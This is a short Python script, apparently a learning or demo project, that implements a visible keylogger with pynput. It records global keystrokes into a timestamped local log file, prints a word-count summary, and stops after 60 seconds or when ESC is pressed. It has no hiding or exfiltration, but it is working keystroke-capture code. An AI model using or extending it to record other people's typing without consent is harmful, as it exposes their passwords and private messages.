import os
import time
from datetime import datetime
from pynput import keyboard

class ProKeyLogger:
    def __init__(self, duration=60):
        self.duration = duration
        self.start_time = time.time()
        self.current_sentence = ""
        self.full_log = []
        self.listener = None
        self.special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n[ENTER]\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.esc: "[ESC]",
        }
        self.log_file = self.create_log_file()

    def create_log_file(self):
        log_dir = "logs"
        os.makedirs(log_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        return os.path.join(log_dir, f"ProKeyLog_{timestamp}.txt")

    def write_log_to_file(self):
        with open(self.log_file, "w", encoding="utf-8") as f:
            f.write("📝 ProKeyLogger Log File\n")
            f.write(f"📅 Session Time: {datetime.now()}\n\n")
            for line in self.full_log:
                f.write(line)
            # Also write remaining unsaved content
            if self.current_sentence.strip():
                f.write(self.current_sentence + "\n")
        print(f"\n✅ Log saved to: {self.log_file}")

    def print_summary(self):
        total_words = sum(len(line.split()) for line in self.full_log)
        total_words += len(self.current_sentence.split())
        duration = round(time.time() - self.start_time, 2)
        print(f"\n🧾 Summary:")
        print(f"  Words typed     : {total_words}")
        print(f"  Session duration: {duration} seconds")

    def on_press(self, key):
        if time.time() - self.start_time > self.duration:
            print("\n⏰ Time limit reached. Stopping logger...")
            self.listener.stop()
            return

        if key == keyboard.Key.esc:
            print("\n🔒 ESC key detected. Exiting logger...")
            self.listener.stop()
            return

        try:
            if key in self.special_keys:
                special = self.special_keys[key]
                if special == "\n[ENTER]\n":
                    self.full_log.append(self.current_sentence + "\n")
                    self.current_sentence = ""
                elif special == "[BACKSPACE]":
                    self.current_sentence = self.current_sentence[:-1]
                else:
                    self.current_sentence += special
            elif hasattr(key, 'char') and key.char is not None:
                self.current_sentence += key.char
        except Exception as e:
            print(f"⚠️ Error: {e}")

    def on_release(self, key):
        pass  # Not needed in this setup

    def run(self):
        print("🔐 ProKeyLogger Started!")
        print(f"🕒 It will auto-stop in {self.duration} seconds or press ESC to exit manually.")
        print("📂 Logs saved in /logs folder.\n")

        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as self.listener:
            self.listener.join()

        # Write log and summary
        self.write_log_to_file()
        self.print_summary()


# Run the logger
if __name__ == "__main__":
    logger = ProKeyLogger(duration=60)
    logger.run()
